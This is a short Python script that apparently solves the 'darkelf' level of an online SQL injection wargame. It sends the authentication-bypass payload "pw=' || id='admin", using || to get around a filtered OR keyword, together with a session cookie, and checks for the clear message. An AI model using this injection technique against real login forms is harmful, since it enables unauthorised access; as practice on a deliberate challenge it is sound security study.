import requests

url = 'https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = "?pw=' || id='admin"

r = requests.get(url + payload, cookies=cookie)
if 'DARKELF Clear!' in r.text:
    print('DARKELF Clear!')
